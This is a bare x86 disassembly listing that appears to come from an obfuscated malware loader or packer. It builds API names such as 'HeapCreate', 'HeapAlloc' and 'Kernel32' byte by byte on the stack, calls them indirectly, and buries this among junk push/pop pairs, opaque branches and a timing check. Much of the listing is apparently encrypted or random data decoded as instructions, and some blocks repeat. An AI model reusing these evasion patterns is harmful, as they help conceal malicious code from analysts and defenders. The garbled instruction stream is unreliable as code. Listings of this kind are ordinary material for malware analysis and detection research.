fadd [ ecx + 0x35 ]
jo r-xdata
jecxz r-xdata
or bl dl
xor eax 0xcaee5b15
dec edi
cmp [ esi ] cl
sub eax 0xa71e91f
push edx
cmp [ esi + 0x7b ] cl
pop ds
xchg edi eax
push ecx
adc ebp [ edi ]
loop r-xdata
loopne r-xdata
mov [ esp + 0x2 ] 0x61
jmp r-xdata
sti
mov edi 0xd27f35b8
inc ecx
outsd
jpe r-xdata
pop ebx
fnstsw [ esi + 0x35b96b62 ]
jg r-xdata
push ebp
dec ebx
mov ecx 0xd39df635
adc eax 0xbce28b80
mov eax [ 0x77be7ed2 ]
imul edi [ ecx - 0x1d2f80cb ] 0x2d
inc esp
pop ebx
mov dh 0xb1
mov ds [ edx - 0x47 ]
xor eax 0x37b9e0ff
jg r-xdata
mov [ esp + 0x3 ] 0x70
jmp r-xdata
adc eax 0x1be5465e
jg r-xdata
cli
lea esi [ 0xffffffffcd3a5b7f ]
pop esi
inc esi
in eax 0x1b
hlt
mov ecx 0xb8bffb3a
xor eax 0x6f41d27f
mov [ esp + 0x4 ] 0x43
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x5 ] 0x72
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
sub eax 0xe15b7f35
or [ gs : ebx + 0x5b7f1184 ] 0xf9
cmp al 0xdb
jle r-xdata
pop edi
mov ecx 0x19ce8035
xor eax 0x35d35b7f
or dh 0x19
xor eax 0x35845b7f
jpo r-xdata
xor cl [ esi ]
hlt
mov [ esp + 0x6 ] 0x65
push di
pop di
mov [ esp + 0x7 ] 0x61
push si
pop si
mov [ esp + 0x8 ] 0x74
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
scasb [ edi ]
loope r-xdata
inc ecx
jle r-xdata
pop ebx
stc
mov ecx 0x505f32be
push cs
imul ebx [ ebx - 0x47 ] 0xb622976f
xor eax 0x953cd27f
jg r-xdata
pop ebx
shl [ 0x35d35b15 ] cl
mov ecx 0xb8e7fd3a
mov [ esp + 0x9 ] 0x65
mov edx esp
jmp r-xdata
inc ebx
dec esp
add [ ecx - 0x6a ] edx
jno r-xdata
xchg edi eax
mov ah 0xa8
xor eax 0x31f4d07f
xchg esi eax
mov esi 0x17f35ac
push ecx
shl [ ecx + 0x5b ] cl
mov ecx 0xd35b1565
xor eax 0x35d35b15
jo r-xdata
cld
movsd [ edi ] [ esi ]
xor eax 0x3651017f
jo r-xdata
pop ebx
mov ecx 0xb9cfeaca
xor eax 0x45f4d07f
xchg esi eax
mov ecx 0xb95f7f5d
xor eax 0x3519ce80
jg r-xdata
jg r-xdata
mov dl 0x5c
and [ edi + 0x5b ] bh
jecxz r-xdata
shl ah 0x1
xor [ esi + 0x7f35acbe ] edx
add [ ecx - 0x2e ] edx
jno r-xdata
loopne r-xdata
call sub_4525f6
mov [ ebp + 0x10 ] cl
push 0x0
mov [ ebp + 0x10 ] cl
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
add [ esp ] 0x40000
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
call eax
push si
pop si
mov [ ebp + 0x8 ] eax
pop eax
pop eax
pop eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov ecx esp
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push 0x0
push 0x0
xor [ esp ] 0x48
mov [ ebp + 0x10 ] cl
xor [ esp + 0x1 ] 0x64
jmp r-xdata
shl ah 0x1
mov ecx 0x326b3abc
js r-xdata
cmp ah [ ebx ]
push eax
shl ah 0x1
xor [ esi + 0x7f35ac94 ] edx
mov bl 0xd
cmp edi [ edi + 0x5b ]
xor [ eax + 0x53 ] dh
scasb [ edi ]
shl [ 0x3519ce80 ] cl
jg r-xdata
in eax 0x6b
pop ebx
mov ecx 0xad83966c
xor eax 0x7e51017f
jno r-xdata
push 0x71
pop ebx
push ecx
pop ebx
shl [ 0x35a8b497 ] cl
jg r-xdata
test eax 0xf635b955
push ds
popfd
mov esi 0x37505f32
imul ebx [ ebx - 0x47 ] 0xb79e976f
pop edi
push eax
pop esp
mov ecx 0x327b3abc
js r-xdata
jg r-xdata
xor ch [ ebx ]
push eax
push esp
push 0x976fb95b
sbb dh [ esi + 0x4f6a7f35 ]
add al 0x80
or edx ebx
cmp al [ eax + 0x7f352dce ]
inc [ esp + 0x1 ]
push di
pop di
mov [ esp + 0x2 ] 0x61
jmp r-xdata
mov ecx 0xd3533abc
xor [ edi ] edx
pop ebx
test eax 0xb9337f35
mov ch 0x7f
pop ebx
shl [ 0x6046a415 ] cl
jg r-xdata
mov dl 0x45
and [ edi + 0x5b ] edi
jecxz r-xdata
pop ebx
xor [ esi + 0x7f35ac54 ] edx
add [ ecx + 0xe ] edx
mov ecx 0xf4d0b8bc
pop ebx
xor eax 0x22e6b27f
jg r-xdata
test [ 0x3ab95b7b ] dh
std
out 0xb8 eax
cdq
inc eax
fwait
fadd [ esi + 0x31 ]
add [ eax - 0x2f ] edx
jne r-xdata
hlt
pop ebx
loope r-xdata
jpe r-xdata
cmp cl ch
xor eax 0x1dfcd27f
hlt
pop ebx
mov ecx 0xb79e976f
or [ ebx + 0x5b7f1184 ] 0xf9
mov [ esp + 0x3 ] 0x70
push si
pop si
mov [ esp + 0x4 ] 0x41
push di
pop di
mov [ esp + 0x5 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x7 ] 0x6f
push si
pop si
mov [ esp + 0x8 ] 0x63
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov edx esp
call sub_4525f6
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
mov [ ebp + 0x10 ] cl
add [ esp ] 0x2f84
jmp r-xdata
jg r-xdata
jg r-xdata
jno r-xdata
push esp
lodsb [ esi ]
xor eax 0xe51017f
mov ecx 0x460b2b35
loop r-xdata
push 0x5b
mov ecx 0xb7da976f
xor eax 0x55fcd27f
hlt
in eax dx
push ebp
mov ecx 0x8d1ef635
mov esi 0x5c505f32
js r-xdata
fwait
dec ebp
mov ecx 0x5db32535
cmp [ edi + 0x5b ] bh
mov dh ch
test dh 0x25
xor eax 0x1e525b7f
push 0x8
push di
pop di
push [ ebp + 0x8 ]
jmp r-xdata
jle r-xdata
push ecx
push ecx
les ebx [ edi + edx ]
jmp ebp
in eax 0xb5
xor al 0x7f
pop ebx
leave
cmp edi [ edi + 0x5b ]
xor [ eax + 0x33 ] dh
shl ah 0x1
xor [ esi + 0x7f35af5f ] edx
add [ ecx + 0x6a ] edx
jno r-xdata
cmp eax 0x35be5b7f
daa
mov dl 0x4a
and [ edi + 0x5b ] bh
cld
call eax
push si
pop si
jmp r-xdata
and al 0xd2
push eax
mov ah 0xbe
push edx
push ds
pop ebx
mov ch 0x34
jg r-xdata
sub al 0xa1
jg r-xdata
ja r-xdata
test [ esi - 0x47 ] ecx
xor eax 0x3841b325
jg r-xdata
loopne r-xdata
pop ebx
mov ecx 0x50233abc
pop ebx
mov ecx 0xfc9c7840
aam 0xfc
jno r-xdata
mov ecx 0x2ca47cf8
test eax 0xddb95b7f
scasd [ edi ]
movsb [ edi ] [ esi ]
pop ebx
jpo r-xdata
loopne r-xdata
xor [ eax + 0x2f ] dh
mov dl 0x67
and edi [ edi + 0x5b ]
or edi [ edx + 0x35 ]
jg r-xdata
sbb al 0x17
shr [ edi + 0x30037f35 ] 0x1
jg r-xdata
daa
mov dl 0xb1
and edi [ edi + 0x5b ]
mov dl 0x15
and bh [ edi + 0x5b ]
loope r-xdata
sub al 0xa9
jg r-xdata
mov ecx 0xd3537f35
jne r-xdata
jg r-xdata
int1
dec esp
mov ecx 0xcca42635
or eax 0x6466b80
sar ah 0x1
cmp [ edx - 0x67 ] edi
jg r-xdata
cmp al [ edi + 0x39 ]
or eax 0x6d3d547e
jne r-xdata
jo r-xdata
add esi [ eax ]
0x17f4
mov ecx 0x46a4afdd
xchg esi eax
pushfd
scasd [ edi ]
xor eax 0xdfcd47f
xchg esi eax
shr [ edi - 0x32b80cb ] 0x9
xchg esi eax
scasb [ edi ]
stosd [ edi ]
xor eax 0x75fcd47f
xchg esi eax
pop ebx
mov [ 0x35d30c7f ] esi
adc eax 0x776046a4
fcom [ esi + 0x31 ]
cld
mov ecx 0xf4d02435
cld
sub esp edi
arpl [ eax - 0x154c8ec0 ] di
and al 0x7f
pop ebx
cmp cl ch
jle r-xdata
shl al 0x1
adc [ esi ] ebp
mov ecx 0xbc573abe
idiv [ esi ]
pop ebx
mov ecx 0x7f167ff3
jne r-xdata
cmp [ esi + 0x7f35af9c ] edx
aam 0xfc
or eax 0x35afc196
jg r-xdata
mov ecx 0xfcd29641
shl [ 0x6046a415 ] cl
ja r-xdata
loop r-xdata
pop ebx
cmp esp esi
dec ebx
xor [ ebx + edi * 2 - 0x69ca46b9 ] ah
out 0x9e eax
xor eax 0x4046027f
inc edi
movsb [ edi ] [ esi ]
mov cl dl
dec edi
or dh [ edx ]
jo r-xdata
mov ecx 0x3a433abe
or eax 0xdcf12f7f
add eax 0x2435b94d
cld
or [ esi + 0x7f35abae ] edx
aam 0xfc
jne r-xdata
xor eax 0x1f35b958
pop esi
jpo r-xdata
jg r-xdata
mov ecx 0x34d01f35
xchg ecx eax
cmp al 0x4b
ja r-xdata
shl [ esi ] 0x1
int1
fdivr [ esi - 0x34cfa8fe ]
div [ ebx + 0x5f ]
add [ eax + 0x3 ] edx
push 0xf46db95b
inc esi
mov [ 0xffffffffd29641b9 ] eax
cld
push esi
xor esp edi
test eax 0xb6b95b7f
xchg [ ecx - 0x3c ] edx
pop edi
stosb [ edi ]
xor eax 0x71fcd47f
xchg esi eax
mov ecx 0xd358f635
jne r-xdata
mov al [ 0x5f73f638 ]
mov ecx 0xb949b2dc
xor eax 0x3935b325
jg r-xdata
shl [ ecx + edx * 4 ] 0x1
pop ds
jg r-xdata
dec ecx
mov ecx 0x35b32535
cmp [ edi + 0x5b ] edi
mov ecx 0xb94d7bdc
xor eax 0x23b1b227
jg r-xdata
pop ebx
mov ecx 0xbe9fe0bc
xor eax 0x65e6d07f
test ah 0x71
xor bh [ edi + 0x5b ]
xor ch [ edx + 0x2b ]
shl [ esi ] cl
stc
js r-xdata
pop ebx
xor [ eax + 0x27 ] dh
mov ch 0x62
xchg edi eax
push eax
mov ch 0x35
jg r-xdata
inc edi
pop edx
mov dh 0xb1
jmp 0xffffffffba452120
pop ebx
mov ecx 0x305bf46d
jo r-xdata
jmp 0xffffffffb998fcbb
pop ebx
mov ecx 0xb14fc0b6
xor eax 0xb1b65b7f
ror edx cl
int 0x7f
das
dec ebx
pop edi
aas
xor edi [ ecx + 0x465b7f05 ]
xor [ edi + 0x53 ] 0xb9
xor eax 0x3db9ec80
jg r-xdata
pop ebx
mov ecx 0x3a6f2aca
mov ecx 0x321b90b6
mov dl 0xbf
pop ebx
mov ecx 0xaddcf635
cmp eax 0xb2325b7f
jg r-xdata
add [ 0xfffffffff7b95b7f ] esi
ja r-xdata
dec [ ecx ]
hlt
jg r-xdata
mov dl 0x46
and edi [ edi + 0x5b ]
loope r-xdata
dec edi
push ecx
xor dh [ edx + 0x35b95773 ]
cld
mov [ 0xffffffffc3fb3ab9 ] eax
mov ecx 0x3e587f35
xor eax 0xbcb95b77
cmp cl [ ebx + 0x32 ]
mov dl 0x7f
push edi
mov ecx 0xcc9bfa35
xor esi esp
ja r-xdata
mov ecx 0xa1dcf635
cmp eax 0x6a325b7f
inc ebx
fidivr [ edx - 0x33 ]
jg r-xdata
jpe r-xdata
sbb eax 0xe35b7f27
fld [ 0xffffffff9435b957 ]
dec eax
jecxz r-xdata
aas
sbb [ 0xffffffffbeb95b7f ] al
aas
push edi
xor dh [ ebp + 0x73 ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
mov ecx 0xefa87e6b
mov esp 0xf33a057c
jpo r-xdata
xor eax 0x34b95b77
test al 0xb3
xor eax 0x25fc9c7f
jg r-xdata
or [ esi ] 0xb1
mov dh 0x87
mov ecx 0xb9ec8035
cmp eax 0xcad35b7f
pop ebx
int 0xd6
mul [ ebp + 0x4b7ff338 ]
mov ecx 0xe8924e35
0x4b09
mov ecx 0x7fd8256e
sbb eax 0x779198fc
sub eax 0x77312e62
pop ebx
mov ecx 0xea4a040
xor eax 0xcab95b77
sub ch [ edi + 0x3a ]
mov ecx 0xb14be0bc
xor eax 0xb447d27f
mov ecx 0x7f35a95b
push 0x6b
sub al 0x31
xchg ecx eax
mov esi 0xedb8573a
das
or eax 0x5b744051
shl ah 0x1
fadd [ 0x2435b94d ]
clc
xor eax 0x5b510b7f
ja r-xdata
out 0x1d al
test ah 0xa9
cmp eax 0xbedf5b7f
and [ ebp - 0x21 ] bl
mov esp 0x35be9fe0
jg r-xdata
sub al 0x9
fnstsw [ esi + 0x35b94372 ]
jg r-xdata
add al [ ebx ]
mov eax 0xb207fb3a
xor eax 0x5183f7f
jg r-xdata
mov ecx 0x305b7f35
jge r-xdata
shl [ esi ] 0x1
cmp eax 0xdeb95b77
jpe r-xdata
mov ecx 0xefa87e6b
mov esp 0xbe9bb07c
ficomp [ bp + si - 0x36 ]
sbb [ ebx - 0x47 ] 0xbc
and cl [ edi + 0x51 ]
mov esi [ ebp + 0x5b ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
xlat
jne r-xdata
push edx
adc dh ah
inc ebx
mov edx 0xb9537faa
xor eax 0xbcbb98fc
and cl [ edi + 0x51 ]
sub ch [ ebx + 0x26 ]
fdivr [ eax + 0x21 ]
xchg esi eax
insb
inc esi
0xb380
fsubr [ ecx + 0x305b7f39 ]
mov dl 0x7f
push edi
mov ecx 0xefad4e35
mov esi 0x35b55bf8
mov ecx 0xad1eb835
xor eax 0xb6b95b7f
ror [ edi - 0x4f ] 0x35
jg r-xdata
mov ch 0x34
mov esp 0x17757ed8
mov [ 0x87f35b9 ] eax
out dx al
fisttp [ ebx - 0xbca46b0 ]
add al 0x8d
mov esp 0x35be9be0
jg r-xdata
js r-xdata
int1
xor al 0x91
movsb [ edi ] [ esi ]
imul ebx esi 0xca51b36a
and [ esi + eax * 2 + 0x465f5b41 ] 0x61
pop ebx
push edi
[ esi ] ebp
fdivr [ edi + 0x1d ]
mov ecx 0x32573fbe
jne r-xdata
jg r-xdata
ror [ esi ] 0x1
xor eax 0xbcb95b77
cmovae edi [ edx - 0x46acd07e ]
xor eax 0xb6a52bf6
add al [ ebx ]
mov eax 0x47d22b41
mov ah 0xb9
pop ebx
test eax 0x706a7f35
mul [ fs : ebx + 0x5b7335bc ]
mov ecx 0xb21a9765
xor eax 0x4346087f
add edi [ eax + 0x47d22b41 ]
jg r-xdata
pop ebx
mov ch 0x35
mov dh 0x5b
mov ecx 0xed02e35
and [ edi + 0x5b ] esi
mov ecx 0xb15bf8be
xor eax 0x34495a7f
mov bh 0x31
lodsd [ esi ]
mul [ gs : eax + 0x577ff638 ]
mov ecx 0xfb32c35
aas
jg r-xdata
mov dh 0xb1
ja r-xdata
ja r-xdata
inc esi
inc ebx
xor eax 0x65b95b77
adc eax 0x1f6046a4
mov ecx 0xba430fbc
sub [ edi ] 0x53
mov ecx 0xa52bf635
mov dh 0x2
pushad
xor [ ss : edi + 0x5b ] esi
mov ecx 0x41d2ad40
xor [ edi + 0x57 ] bh
mov ecx 0xbb312f35
0x57c8
xor eax 0x36b95b77
cmp [ edi - 0x17 ] edx
pop edi
and [ esp + ebp * 8 + 0x7fd82655 ] 0x1d
shl bh 0x1
add esi esi
adc al 0xbd
mov esi 0xba300b31
adc ebx [ edx - 0x47 ]
xor eax 0xbcb526f4
xchg al bl
js r-xdata
shr [ esi ] 0x1
ja r-xdata
mov ecx 0x46a41565
pushad
pop ds
pop edx
mov ecx 0xb526f435
mov esp 0x7d78d886
mov ecx 0xb15be836
xor eax 0x38323f7f
mov [ 0x16fa3ab8 ] eax
not [ esi * 4 + 0x301fbeb6 ]
jpe r-xdata
inc esi
0xd080
cli
fdivr [ eax + 0x25 ]
not [ ecx + ebp * 4 ]
pop ebx
mov ecx 0xbd1af435
mov esp 0x6530af2f
mov [ 0xffffffff94b67ad2 ] eax
xor [ si ] ch
cld
cwde
test [ esi - 0x16cfd06c ] esi
cld
cwde
mov cl 0xbc
mov [ 0xfffffffff40578d8 ] al
inc edx
mov ah bh
dec esi
lodsd [ esi ]
mov dl cl
cmp [ ecx - 0x2d8cb7ce ] 0x41
xor [ ebp - 0x9ca46e6 ] bh
push ds
in eax dx
mov esi 0x44320f32
inc ebx
pop edx
ja r-xdata
dec eax
mov ah 0xbe
mov edi [ ecx - 0x92d80cb ]
jno r-xdata
adc al 0xa9
push ss
mov ebp 0xb94b1bdc
xor eax 0x3cb9b325
jg r-xdata
push ss
inc esi
in eax 0xf6
push ds
rcr ebp 0x1
adc eax 0xf635b953
push ds
aad 0xbc
xchg [ esi + 0x45 ] ebx
cmp bh [ edi + 0x5b ]
xor bh [ eax + 0x27 ]
shl [ ecx - 0x32a4794a ] cl
cmp esi esp
push ds
in eax dx
mov esi 0xedb86727
sbb [ ecx + edi * 8 + 0x325b7f21 ] ebx
js r-xdata
enter 0xb837 0x35
jg r-xdata
mov dl 0x86
and eax 0xdde35b7f
mov ecx 0x8035b953
sub al 0xb1
0x5708
inc esi
in eax 0xfc
into
xor esp esi
adc al 0xb1
0xa44e
sub_452580
pop edx
inc edx
call sub_4525f6
push eax
push [ ebp + 0x52 ]
push 0x0
call eax
cmp eax 0x1
je r-xdata
pop eax
push [ ebp + 0x52 ]
push 0x2
call eax
mov ecx 0xaa0000
call sub_45257d
push ebx
dec eax
inc ebp
dec esp
dec esp
xor esi [ edx ]
inc esp
dec esp
dec esp
and [ eax ] al
rdtsc
loop r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
mov [ esp + 0x7 ] 0x32
mov [ esp ] 0x4b
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov [ esp + 0x1 ] 0x65
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x33
push di
pop di
mov [ esp + 0x3 ] 0x6e
push di
pop di
mov [ ebp + 0x10 ] cl
mov [ esp + 0x5 ] 0x6c
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
push si
pop si
mov [ esp + 0x2 ] 0x72
push di
pop di
mov [ esp + 0x4 ] 0x65
mov eax ecx
mov ecx esp
add ecx eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
inc ebx
dec esp
xor [ esp ] 0x48
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov dl 0x65
or [ esp + 0x1 ] dl
jmp r-xdata
inc ebx
dec esp
mov [ esp + 0x2 ] 0x61
jmp r-xdata
mov [ esp + 0x3 ] 0x70
jmp r-xdata
mov [ esp + 0x4 ] 0x43
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x5 ] 0x72
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov [ esp + 0x6 ] 0x65
push di
pop di
mov [ esp + 0x7 ] 0x61
push si
pop si
mov [ esp + 0x8 ] 0x74
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
mov [ esp + 0x9 ] 0x65
mov edx esp
jmp r-xdata
inc ebx
dec esp
call sub_4525f6
mov [ ebp + 0x10 ] cl
push 0x0
mov [ ebp + 0x10 ] cl
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
add [ esp ] 0x40000
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
call eax
push si
pop si
mov [ ebp + 0x8 ] eax
pop eax
pop eax
pop eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov ecx esp
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push 0x0
push 0x0
xor [ esp ] 0x48
mov [ ebp + 0x10 ] cl
xor [ esp + 0x1 ] 0x64
jmp r-xdata
inc [ esp + 0x1 ]
push di
pop di
mov [ esp + 0x2 ] 0x61
jmp r-xdata
mov [ esp + 0x3 ] 0x70
push si
pop si
mov [ esp + 0x4 ] 0x41
push di
pop di
mov [ esp + 0x5 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x7 ] 0x6f
push si
pop si
mov [ esp + 0x8 ] 0x63
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov edx esp
call sub_4525f6
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
mov [ ebp + 0x10 ] cl
add [ esp ] 0x2f84
jmp r-xdata
push 0x8
push di
pop di
push [ ebp + 0x8 ]
jmp r-xdata
call eax
push si
pop si
jmp r-xdata
call sub_452903
in al dx
mov esp 0x2d183f9a
jg r-xdata
mov dl 0x29
and edi [ edi + 0x5b ]
mov ecx 0x396b3fbe
dec ebp
jge r-xdata
bswap ebx
sub [ ecx ] ecx
andps xmm7 [ 0xffffffffb95b7c23 ]
lea edi [ esi + 0x5b ]
mov ecx 0x30f97035
in eax 0xbe
mov bl 0xae
mov dh 0x9f
mov dh 0xb1
dec esi
pop eax
mov ecx 0xddcbef35
xchg esp eax
dec edi
pop ebx
mov ecx 0x33cbef35
jne r-xdata
loop r-xdata
cmp al 0xcb
jge r-xdata
pop edx
cmp cl ch
jle r-xdata
mov esi 0x9fb6aeb3

pop ebx
out dx al
0x4f2e
pop ss
pop ebx
test eax 0xb1317f35
or [ ebx + 0x4d54dce9 ] 0xb9
xor eax 0x238ab226
jg r-xdata
mov ebp ecx
fcom [ ebp + ecx * 2 - 0x47 ]
mov ecx 0xb94c51dc
xor eax 0x31f4d226
xchg esi eax
mov eax [ ss : 0x51017f35 ]
mov dh 0x6f
pop ebx
mov ecx 0xb9cffabc
xor eax 0x2329b27f
jg r-xdata
fadd [ ecx + 0x35 ]
jo r-xdata
jecxz r-xdata
or bl dl
xor eax 0xcaee5b15
dec edi
cmp [ esi ] cl
sub eax 0xa71e91f
push edx
cmp [ esi + 0x7b ] cl
pop ds
xchg edi eax
push ecx
adc ebp [ edi ]
loop r-xdata
loopne r-xdata
sti
mov edi 0xd27f35b8
inc ecx
outsd
jpe r-xdata
pop ebx
fnstsw [ esi + 0x35b96b62 ]
jg r-xdata
push ebp
dec ebx
mov ecx 0xd39df635
adc eax 0xbce28b80
mov eax [ 0x77be7ed2 ]
imul edi [ ecx - 0x1d2f80cb ] 0x2d
inc esp
pop ebx
mov dh 0xb1
mov ds [ edx - 0x47 ]
xor eax 0x37b9e0ff
jg r-xdata
adc eax 0x1be5465e
jg r-xdata
cli
lea esi [ 0xffffffffcd3a5b7f ]
pop esi
inc esi
in eax 0x1b
hlt
mov ecx 0xb8bffb3a
xor eax 0x6f41d27f
sub eax 0xe15b7f35
or [ gs : ebx + 0x5b7f1184 ] 0xf9
cmp al 0xdb
jle r-xdata
pop edi
mov ecx 0x19ce8035
xor eax 0x35d35b7f
or dh 0x19
xor eax 0x35845b7f
jpo r-xdata
xor cl [ esi ]
hlt
scasb [ edi ]
loope r-xdata
inc ecx
jle r-xdata
pop ebx
stc
mov ecx 0x505f32be
push cs
imul ebx [ ebx - 0x47 ] 0xb622976f
xor eax 0x953cd27f
jg r-xdata
pop ebx
shl [ 0x35d35b15 ] cl
mov ecx 0xb8e7fd3a
add [ ecx - 0x6a ] edx
jno r-xdata
xchg edi eax
mov ah 0xa8
xor eax 0x31f4d07f
xchg esi eax
mov esi 0x17f35ac
push ecx
shl [ ecx + 0x5b ] cl
mov ecx 0xd35b1565
xor eax 0x35d35b15
jo r-xdata
cld
movsd [ edi ] [ esi ]
xor eax 0x3651017f
jo r-xdata
pop ebx
mov ecx 0xb9cfeaca
xor eax 0x45f4d07f
xchg esi eax
mov ecx 0xb95f7f5d
xor eax 0x3519ce80
jg r-xdata
jg r-xdata
mov dl 0x5c
and [ edi + 0x5b ] bh
jecxz r-xdata
shl ah 0x1
xor [ esi + 0x7f35acbe ] edx
add [ ecx - 0x2e ] edx
jno r-xdata
loopne r-xdata
shl ah 0x1
mov ecx 0x326b3abc
js r-xdata
cmp ah [ ebx ]
push eax
shl ah 0x1
xor [ esi + 0x7f35ac94 ] edx
mov bl 0xd
cmp edi [ edi + 0x5b ]
xor [ eax + 0x53 ] dh
scasb [ edi ]
shl [ 0x3519ce80 ] cl
jg r-xdata
in eax 0x6b
pop ebx
mov ecx 0xad83966c
xor eax 0x7e51017f
jno r-xdata
push 0x71
pop ebx
push ecx
pop ebx
shl [ 0x35a8b497 ] cl
jg r-xdata
test eax 0xf635b955
push ds
popfd
mov esi 0x37505f32
imul ebx [ ebx - 0x47 ] 0xb79e976f
pop edi
push eax
pop esp
mov ecx 0x327b3abc
js r-xdata
jg r-xdata
xor ch [ ebx ]
push eax
push esp
push 0x976fb95b
sbb dh [ esi + 0x4f6a7f35 ]
add al 0x80
or edx ebx
cmp al [ eax + 0x7f352dce ]
mov ecx 0xd3533abc
xor [ edi ] edx
pop ebx
test eax 0xb9337f35
mov ch 0x7f
pop ebx
shl [ 0x6046a415 ] cl
jg r-xdata
mov dl 0x45
and [ edi + 0x5b ] edi
jecxz r-xdata
pop ebx
xor [ esi + 0x7f35ac54 ] edx
add [ ecx + 0xe ] edx
mov ecx 0xf4d0b8bc
pop ebx
xor eax 0x22e6b27f
jg r-xdata
test [ 0x3ab95b7b ] dh
std
out 0xb8 eax
cdq
inc eax
fwait
fadd [ esi + 0x31 ]
add [ eax - 0x2f ] edx
jne r-xdata
hlt
pop ebx
loope r-xdata
jpe r-xdata
cmp cl ch
xor eax 0x1dfcd27f
hlt
pop ebx
mov ecx 0xb79e976f
or [ ebx + 0x5b7f1184 ] 0xf9
jg r-xdata
jg r-xdata
jno r-xdata
push esp
lodsb [ esi ]
xor eax 0xe51017f
mov ecx 0x460b2b35
loop r-xdata
push 0x5b
mov ecx 0xb7da976f
xor eax 0x55fcd27f
hlt
in eax dx
push ebp
mov ecx 0x8d1ef635
mov esi 0x5c505f32
js r-xdata
fwait
dec ebp
mov ecx 0x5db32535
cmp [ edi + 0x5b ] bh
mov dh ch
test dh 0x25
xor eax 0x1e525b7f
jle r-xdata
push ecx
push ecx
les ebx [ edi + edx ]
jmp ebp
in eax 0xb5
xor al 0x7f
pop ebx
leave
cmp edi [ edi + 0x5b ]
xor [ eax + 0x33 ] dh
shl ah 0x1
xor [ esi + 0x7f35af5f ] edx
add [ ecx + 0x6a ] edx
jno r-xdata
cmp eax 0x35be5b7f
daa
mov dl 0x4a
and [ edi + 0x5b ] bh
cld
and al 0xd2
push eax
mov ah 0xbe
push edx
push ds
pop ebx
mov ch 0x34
jg r-xdata
sub al 0xa1
jg r-xdata
ja r-xdata
test [ esi - 0x47 ] ecx
xor eax 0x3841b325
jg r-xdata
loopne r-xdata
pop ebx
mov ecx 0x50233abc
pop ebx
mov ecx 0xfc9c7840
aam 0xfc
jno r-xdata
mov ecx 0x2ca47cf8
test eax 0xddb95b7f
scasd [ edi ]
movsb [ edi ] [ esi ]
pop ebx
jpo r-xdata
loopne r-xdata
xor [ eax + 0x2f ] dh
mov dl 0x67
and edi [ edi + 0x5b ]
or edi [ edx + 0x35 ]
jg r-xdata
sbb al 0x17
shr [ edi + 0x30037f35 ] 0x1
jg r-xdata
daa
mov dl 0xb1
and edi [ edi + 0x5b ]
mov dl 0x15
and bh [ edi + 0x5b ]
loope r-xdata
sub al 0xa9
jg r-xdata
mov ecx 0xd3537f35
jne r-xdata
jg r-xdata
int1
dec esp
mov ecx 0xcca42635
or eax 0x6466b80
sar ah 0x1
cmp [ edx - 0x67 ] edi
jg r-xdata
cmp al [ edi + 0x39 ]
or eax 0x6d3d547e
jne r-xdata
jo r-xdata
add esi [ eax ]
0x17f4
mov ecx 0x46a4afdd
xchg esi eax
pushfd
scasd [ edi ]
xor eax 0xdfcd47f
xchg esi eax
shr [ edi - 0x32b80cb ] 0x9
xchg esi eax
scasb [ edi ]
stosd [ edi ]
xor eax 0x75fcd47f
xchg esi eax
pop ebx
mov [ 0x35d30c7f ] esi
adc eax 0x776046a4
fcom [ esi + 0x31 ]
cld
mov ecx 0xf4d02435
cld
sub esp edi
arpl [ eax - 0x154c8ec0 ] di
and al 0x7f
pop ebx
cmp cl ch
jle r-xdata
shl al 0x1
adc [ esi ] ebp
mov ecx 0xbc573abe
idiv [ esi ]
pop ebx
mov ecx 0x7f167ff3
jne r-xdata
cmp [ esi + 0x7f35af9c ] edx
aam 0xfc
or eax 0x35afc196
jg r-xdata
mov ecx 0xfcd29641
shl [ 0x6046a415 ] cl
ja r-xdata
loop r-xdata
pop ebx
cmp esp esi
dec ebx
xor [ ebx + edi * 2 - 0x69ca46b9 ] ah
out 0x9e eax
xor eax 0x4046027f
inc edi
movsb [ edi ] [ esi ]
mov cl dl
dec edi
or dh [ edx ]
jo r-xdata
mov ecx 0x3a433abe
or eax 0xdcf12f7f
add eax 0x2435b94d
cld
